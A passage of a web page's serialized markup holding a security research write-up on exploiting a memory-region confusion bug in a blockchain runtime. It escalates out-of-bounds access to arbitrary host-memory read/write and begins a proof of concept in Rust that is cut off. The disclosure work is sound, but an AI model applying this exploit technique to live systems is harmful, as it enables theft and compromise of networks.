region\\n\",\"$Lcdd\",\"$Lcde\",\"$Lcdf\",\"$Lce0\",\"$Lce1\",\"$Lce2\",\"$Lce3\",\"$Lce4\",\"$Lce5\",\"$Lce6\",\"$Lce7\",\"$Lce8\",\"$Lce9\",\"$Lcea\",\"$Lceb\",\"$Lcec\",\"$Lced\",\"$Lcee\",\"$Lcef\",\"$Lcf0\",\"$Lcf1\",\"$Lcf2\",\"$Lcf3\",\"$Lcf4\",\"$Lcf5\",\"$Lcf6\",\"$Lcf7\",\"$Lcf8\",\"$Lcf9\",\"$Lcfa\",\"$Lcfb\",\"$Lcfc\",\"$Lcfd\",\"$Lcfe\",\"$Lcff\",\"$Ld00\",\"$Ld01\",\"$Ld02\",\"$Ld03\",\"$Ld04\",\"$Ld05\",\"$Ld06\",\"$Ld07\",\"$Ld08\",\"$Ld09\",\"$Ld0a\",\"$Ld0b\",\"$Ld0c\",\"$Ld0d\",\"$Ld0e\",\"$Ld0f\",\"$Ld10\",\"$Ld11\",\"\\n\",\"$Ld12\",\"$Ld13\",\"$Ld14\",\"$Ld15\",\"$Ld16\",\"$Ld17\",\"$Ld18\",\"$Ld19\",\"$Ld1a\",\"$Ld1b\",\"$Ld1c\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"b0:[\"$\",\"p\",\"p-105\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The idea of the patch is that when a CPI happens, changes to the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"owner\"}],\" of an account may be updated and flushed to \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\". One example of this is when creating a new token account. The caller is expected to transfer ownership of an empty account to the token program, and the token program will then initialize the token account with relevant data. Obviously we should no longer allow the caller program to directly write the token account data after the token program has taken ownership of it. With Direct Mapping enabled, this means \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" state must be updated accordingly.\"]}]\n"])</script><script>self.__next_f.push([1,"b1:[\"$\",\"p\",\"p-106\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"At first glance, the patch seemed unrelated to our finding. But unfortunately, updating \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"state\"}],\" means that while we may point the host pointer of an originally writable \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to some unwritable account data, after CPI finishes, the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" will just end up being marked as readonly. This kills our exploit.\"]}]\n"])</script><script>self.__next_f.push([1,"b2:[\"$\",\"p\",\"p-107\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Still, \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"the vulnerability itself hadn't been patched\"}],\". We just need to bypass the new checks, and that is exactly what we, Anatomist Security, are best at. With years of deep security research and CTF experience, we specialize in turning dead ends into breakthroughs.\"]}]\nb3:[\"$\",\"h2\",\"h2-8\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"New Exploitation Strategy\"}]\n"])</script><script>self.__next_f.push([1,"b4:[\"$\",\"p\",\"p-108\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"So back to the drawing board, what else can we do with our bug? The essence of the bug is confusion of \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\". In other words, we could overwrite an arbitrary \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" with another \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\".\"]}]\n"])</script><script>self.__next_f.push([1,"b5:[\"$\",\"p\",\"p-109\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"While our first attempt was to change the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" of a writable \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to some readonly account data buffer, it is definitely not the only way to wield the bug. Our second idea is, instead of trying to write to a readonly account data buffer, what if we changed the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" of a writable \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to the backing buffer of another writable \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" that has a different length?\"]}]\n"])</script><script>self.__next_f.push([1,"b6:[\"$\",\"h3\",\"h3-19\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"The New Attack Vector: Size Confusion\"}]\nb7:[\"$\",\"p\",\"p-110\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"This new idea led us to a completely different exploitation approach. Instead of trying to bypass permission checks, we could exploit size differences between different account buffers for out-of-bound read/write, a primitive commonly used in binary exploitation.\"}]\nb8:[\"$\",\"p\",\"p-111\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Consider two accounts, both writable by the attacker:\"}]\n"])</script><script>self.__next_f.push([1,"b9:[\"$\",\"ul\",\"ul-1\",{\"className\":\"text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6\",\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\": A small-sized buffer account with data length 0x100\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\": A bigger-sized buffer account, with data length 0x400, whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" will be replaced to SWAP's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}]]}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"ba:[\"$\",\"p\",\"p-112\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"If we could make \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" account's \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" point to \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" account's buffer, by accessing \",[\"$\",\"strong\",\"strong-2\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" account's virtual memory, we ends up touching \",[\"$\",\"strong\",\"strong-3\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" account's data buffer on the host. Since the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" of \",[\"$\",\"strong\",\"strong-4\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" has a size of 0x400, larger than the size of the underlying host buffer of \",[\"$\",\"strong\",\"strong-5\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\", once we go past the first 0x100 bytes of \",[\"$\",\"strong\",\"strong-6\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\"'s virtual memory, it will map beyond the end of the \",[\"$\",\"strong\",\"strong-7\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" data buffer. This gives us out-of-bounds read/write primitive on host memory.\"]}]\n"])</script><script>self.__next_f.push([1,"bb:[\"$\",\"h3\",\"h3-20\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"From Limited OOB to Arbitrary read/write\"}]\nbc:[\"$\",\"p\",\"p-113\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"With this, we gain out-of-bounds read/write access to 0x300 bytes (0x400 - 0x100) after \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\"'s data buffer in host memory. However, this primitive is limited to a specific range. We need to make it more powerful.\"]}]\n"])</script><script>self.__next_f.push([1,"bd:[\"$\",\"p\",\"p-114\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The idea is straightforward: since \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" structures also reside in host memory, we can scan the out-of-bounds region to locate other \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" structures. By modifying their \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" fields to point to our target addresses, accessing the corresponding virtual memory provides arbitrary read/write access to those target addresses. We just need to spray a lot of writable accounts and make the size difference larger to increase the success rate.\"]}]\n"])</script><script>self.__next_f.push([1,"be:[\"$\",\"h2\",\"h2-9\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"Proof-of-Concept\"}]\nbf:[\"$\",\"p\",\"p-115\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Now, let's take a deep dive into a PoC of how to exploit this vulnerability from the ground up.\"}]\nc0:[\"$\",\"h3\",\"h3-21\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Detailed Attack Steps\"}]\nc1:[\"$\",\"p\",\"p-116\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The exploit requires three specific accounts with distinct purposes:\"}]\n"])</script><script>self.__next_f.push([1,"c2:[\"$\",\"ul\",\"ul-2\",{\"className\":\"text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6\",\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\": Small buffer account that serves as the target of the corrupted pointer. Its small buffer will be incorrectly mapped by SWAP's large virtual space.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"POINTER\"}],\": Pointer account whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" will be rewritten during memory scanning to point to arbitrary memory addresses. This account serves as our pointer pivot to achieve arbitrary read/write capability.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\": Large buffer account whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" will be hijacked to point to SWAP's smaller buffer, creating the size mismatch for out-of-bounds access.\"]}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"c3:[\"$\",\"h4\",\"h4-11\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 1: Account Preparation\"}]\nc4:[\"$\",\"p\",\"p-117\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"First, we want to trigger copy-on-write on both \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" and \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" accounts and also resize \",[\"$\",\"strong\",\"strong-2\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" to 1 byte to make the code path later simpler.\"]}]\n"])</script><script>self.__next_f.push([1,"c5:[\"$\",\"pre\",\"pre-15\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Trigger copy-on-write for dedicated buffers\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],\"$Ld1d\",\"$Ld1e\",\"$Ld1f\",\"$Ld20\",\"$Ld21\",\"$Ld22\",\"$Ld23\",\"$Ld24\",\"$Ld25\",\"$Ld26\",\"$Ld27\",\"$Ld28\",\"$Ld29\",\"$Ld2a\",\"$Ld2b\",\"$Ld2c\",\"$Ld2d\",\"$Ld2e\",\"\\n\",\"$Ld2f\",\"$Ld30\",\"$Ld31\",\"$Ld32\",\"$Ld33\",\"$Ld34\",\"$Ld35\",\"$Ld36\",\"$Ld37\",\"$Ld38\",\"$Ld39\",\"$Ld3a\",\"$Ld3b\",\"$Ld3c\",\"$Ld3d\",\"$Ld3e\",\"$Ld3f\",\"$Ld40\",\"$Ld41\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"c6:[\"$\",\"h4\",\"h4-12\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 2: Fake Pointer Setup\"}]\n"])</script><script>self.__next_f.push([1,"c7:[\"$\",\"p\",\"p-118\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Then we want to overwrite SWAP's \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo.data\"}],\" pointer with \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\"'s data pointer. This will cause the runtime to extract \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\"'s data address when retrieving \",[\"$\",\"strong\",\"strong-2\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\"'s \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\" during CPI.\"]}]\n"])</script><script>self.__next_f.push([1,"c8:[\"$\",\"pre\",\"pre-16\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token 